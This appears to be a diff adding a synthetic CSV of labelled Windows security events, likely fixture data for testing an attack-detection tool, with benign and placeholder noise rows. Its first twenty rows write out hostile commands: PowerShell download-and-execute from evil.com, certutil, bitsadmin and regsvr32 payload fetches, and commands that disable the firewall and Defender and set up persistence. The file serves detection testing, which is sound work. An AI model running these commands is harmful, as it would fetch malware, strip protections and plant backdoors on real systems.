@@ -1,0 +1,51 @@
+timestamp,event_type,severity,source,source_ip,dest_ip,target_user,command,description
+2026-07-14T17:00:00,system_event,High,system,192.168.10.50,,administrator,powershell.exe -enc SQBFAFgA,PowerShell EncodedCommand
+2026-07-14T17:00:05,system_event,High,system,192.168.10.50,,administrator,pwsh.exe -WindowStyle Hidden,Hidden PowerShell
+2026-07-14T17:00:10,system_event,High,system,192.168.10.50,,administrator,IEX(New-Object Net.WebClient).DownloadString('http://evil.com'),Invoke Expression
+2026-07-14T17:00:15,system_event,High,system,192.168.10.50,,administrator,powershell.exe -ExecutionPolicy Bypass,Execution Policy Bypass
+2026-07-14T17:00:20,system_event,High,system,192.168.10.50,,administrator,Invoke-Expression whoami,Invoke Expression
+2026-07-14T17:01:00,system_event,Critical,system,192.168.10.50,,administrator,certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe,LOLBin
+2026-07-14T17:01:05,system_event,Critical,system,192.168.10.50,,administrator,bitsadmin /transfer malware http://evil.com/file.exe,LOLBin
+2026-07-14T17:01:10,system_event,Critical,system,192.168.10.50,,administrator,regsvr32.exe /i:http://evil.com/file.sct scrobj.dll,LOLBin
+2026-07-14T17:01:15,system_event,Critical,system,192.168.10.50,,administrator,rundll32.exe javascript:"\..\mshtml",LOLBin
+2026-07-14T17:01:20,system_event,Critical,system,192.168.10.50,,administrator,wmic process call create cmd.exe,LOLBin
+2026-07-14T17:02:00,system_event,Critical,system,192.168.10.50,,administrator,netsh advfirewall set allprofiles state off,Firewall Disabled
+2026-07-14T17:02:10,system_event,Critical,system,192.168.10.50,,administrator,firewall disabled,Firewall Disabled
+2026-07-14T17:03:00,system_event,Critical,system,192.168.10.50,,administrator,Set-MpPreference -DisableRealtimeMonitoring $true,Disable Defender
+2026-07-14T17:03:10,system_event,Critical,system,192.168.10.50,,administrator,real-time protection turned off,Disable Defender
+2026-07-14T17:04:00,system_event,Critical,system,192.168.10.50,,administrator,administrator account created,Admin Created
+2026-07-14T17:04:10,system_event,Critical,system,192.168.10.50,,administrator,user account created with admin rights,Admin Created
+2026-07-14T17:05:00,system_event,Critical,system,192.168.10.50,,administrator,schtasks /create /tn WindowsUpdate /tr malware.exe /sc minute,Persistence
+2026-07-14T17:05:10,system_event,Critical,system,192.168.10.50,,administrator,HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Persistence
+2026-07-14T17:05:20,system_event,Critical,system,192.168.10.50,,administrator,sc create backdoor,Persistence
+2026-07-14T17:05:30,system_event,Critical,system,192.168.10.50,,administrator,HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,Persistence
+2026-07-14T17:06:00,system_event,Low,system,192.168.10.50,,administrator,notepad.exe notes.txt,Benign
+2026-07-14T17:06:05,system_event,Low,system,192.168.10.50,,administrator,calc.exe,Benign
+2026-07-14T17:06:10,system_event,Low,system,192.168.10.50,,administrator,explorer.exe,Benign
+2026-07-14T17:06:15,system_event,Low,system,192.168.10.50,,administrator,cmd.exe /c dir,Benign
+2026-07-14T17:06:20,system_event,Low,system,192.168.10.50,,administrator,tasklist,Benign
+2026-07-14T17:06:25,system_event,Low,system,192.168.10.50,,administrator,ipconfig,Benign
+2026-07-14T17:06:30,system_event,Low,system,192.168.10.50,,administrator,hostname,Benign
+2026-07-14T17:06:35,system_event,Low,system,192.168.10.50,,administrator,ping 8.8.8.8,Benign
+2026-07-14T17:06:40,system_event,Low,system,192.168.10.50,,administrator,whoami,Benign
+2026-07-14T17:06:45,system_event,Low,system,192.168.10.50,,administrator,systeminfo,Benign
+2026-07-14T17:07:00,system_event,Low,system,192.168.10.50,,administrator,event01,Noise
+2026-07-14T17:07:05,system_event,Low,system,192.168.10.50,,administrator,event02,Noise
+2026-07-14T17:07:10,system_event,Low,system,192.168.10.50,,administrator,event03,Noise
+2026-07-14T17:07:15,system_event,Low,system,192.168.10.50,,administrator,event04,Noise
+2026-07-14T17:07:20,system_event,Low,system,192.168.10.50,,administrator,event05,Noise
+2026-07-14T17:07:25,system_event,Low,system,192.168.10.50,,administrator,event06,Noise
+2026-07-14T17:07:30,system_event,Low,system,192.168.10.50,,administrator,event07,Noise
+2026-07-14T17:07:35,system_event,Low,system,192.168.10.50,,administrator,event08,Noise
+2026-07-14T17:07:40,system_event,Low,system,192.168.10.50,,administrator,event09,Noise
+2026-07-14T17:07:45,system_event,Low,system,192.168.10.50,,administrator,event10,Noise
+2026-07-14T17:07:50,system_event,Low,system,192.168.10.50,,administrator,event11,Noise
+2026-07-14T17:07:55,system_event,Low,system,192.168.10.50,,administrator,event12,Noise
+2026-07-14T17:08:00,system_event,Low,system,192.168.10.50,,administrator,event13,Noise
+2026-07-14T17:08:05,system_event,Low,system,192.168.10.50,,administrator,event14,Noise
+2026-07-14T17:08:10,system_event,Low,system,192.168.10.50,,administrator,event15,Noise
+2026-07-14T17:08:15,system_event,Low,system,192.168.10.50,,administrator,event16,Noise
+2026-07-14T17:08:20,system_event,Low,system,192.168.10.50,,administrator,event17,Noise
+2026-07-14T17:08:25,system_event,Low,system,192.168.10.50,,administrator,event18,Noise
+2026-07-14T17:08:30,system_event,Low,system,192.168.10.50,,administrator,event19,Noise
+2026-07-14T17:08:35,system_event,Low,system,192.168.10.50,,administrator,event20,Noise
